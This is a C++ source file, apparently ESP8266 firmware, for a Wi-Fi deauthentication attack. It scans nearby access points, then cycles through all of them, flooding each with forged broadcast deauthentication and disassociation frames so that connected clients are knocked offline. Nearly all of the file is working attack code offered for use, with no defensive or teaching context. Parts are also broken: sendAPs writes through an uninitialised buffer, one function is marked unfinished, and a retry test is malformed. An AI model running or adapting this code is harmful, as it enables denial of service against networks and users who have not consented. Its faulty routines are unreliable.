#include "Attack.h"

Attack::Attack() {
}

void Attack::updateAttack() {
  if (run_attack) {
    if (mode == DEAUTHALL) {
      deauthAll();
    }
  }
}

void Attack::start() {
  Serial.println("<Starting attack>");
  target = 0;
  setChannel(APs[target].channel);
  logAttack(target);
  wifi_promiscuous_enable(1);
  run_attack = true;
}

void Attack::stop() {
  Serial.println("<Stopping attack>");
  wifi_promiscuous_enable(0);
  run_attack = false;
}

void Attack::attackAPs(char* aps) {
  cmd.getList(aps, devices);
  if (millis()-attack_time < 60000) {
    if (millis()-pcktTime >= 50) {
      deauthAP(APs[target].bssid);
      pcktTime = millis();
    }
    if (success_times >= 5000) {
      digitalWrite(2, LOW);
      delay(20);
      digitalWrite(2, HIGH);
      success_times = 0;
    }
  } else {
    target++;
    if (target > devices_c) target = 0;
    setChannel(APs[target].channel);
    logAttack(target);
    pcktTime = 0;
    attack_time = millis();
  }
  Serial.println("<WIP>");
}

void Attack::deauthAll() {
  if (millis()-attack_time < 60000) {
    if (millis()-pcktTime >= 50) {
      deauthAP(APs[target].bssid);
      pcktTime = millis();
    }
    if (success_times >= 5000) {
      digitalWrite(2, LOW);
      delay(20);
      digitalWrite(2, HIGH);
      success_times = 0;
    }
  } else {
    target++;
    if (target > devices_c) target = 0;
    setChannel(APs[target].channel);
    logAttack(target);
    pcktTime = 0;
    attack_time = millis();
  }
}

void Attack::deauthAP(uint8_t* apMac) {
  packetSize = sizeof(deauthPacket);
  memcpy(&deauthPacket[4], broadcast, 6);
  memcpy(&deauthPacket[10], apMac, 6);
  memcpy(&deauthPacket[16], apMac, 6);
  deauthPacket[24] = 0x01;

  deauthPacket[0] = 0xc0;
  if (sendPacket(deauthPacket, packetSize) == 0) {
    success_times++;
  }

  deauthPacket[0] = 0xa0;
  if (sendPacket(deauthPacket, packetSize) == 0) {
    success_times++;
  }
}

int Attack::sendPacket(uint8_t* packet, uint16_t packetSize) {
  int sent = wifi_send_pkt_freedom(packet, packetSize, 0);

  for (int i = 0; i < 6 && !sent == 0; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0);

  return sent;
}

void Attack::scan() {
  digitalWrite(2, LOW);
  WiFi.scanDelete();
  memset(APs, 0, sizeof(APs));
  Serial.println("<Scanning for networks>");
  devices_c = WiFi.scanNetworks();
  if (devices_c >= 0) {
    for (int i = 0; i < devices_c; i++) {
      APs[i].bssid = WiFi.BSSID(i);
      WiFi.BSSIDstr(i).toCharArray(APs[i].bssid_c, 17);
      WiFi.SSID(i).toCharArray(APs[i].ssid, 32);
      APs[i].channel = WiFi.channel(i);
      APs[i].rssi = WiFi.RSSI(i);
      Serial.print("<");
      Serial.print(APs[i].ssid);
      Serial.print(">");
      delay(20);
    }
  }
  digitalWrite(2, HIGH);
}

void Attack::sendAPs(WiFiClient client) {
  char* apData;
  char buf[3];
  strcat(apData, "{\"APs\":[");
  for (int i = 0; i < devices_c; i++) {
    strcat(apData, "{\"SSID\":\"");
    strcat(apData, APs[i].ssid);
    strcat(apData, "\",\"RSSI\":\"");
    itoa(APs[i].rssi, buf, 10);
    strcat(apData, buf);
    strcat(apData, "\",\"BSSID\":\"");
    strcat(apData, APs[i].bssid_c);
    strcat(apData, "\",\"CH\":\"");
    itoa(APs[i].channel, buf, 10);
    strcat(apData, buf);
    if (i == devices_c) break;
    strcat(apData, "\"},");
  }
  strcat(apData, "\"}]}");
  client.write(apData);
}

void Attack::setChannel(uint8_t ch) {
  if (ch != wifi_channel) {
    wifi_channel = ch;
    wifi_set_channel(wifi_channel);
  }
}

void Attack::logAttack(int num) {
  Serial.print("<Sending attack to ");
  Serial.println(APs[num].ssid);
  Serial.print("ESP Channel: ");
  Serial.print(wifi_get_channel());
  Serial.print(">");
}
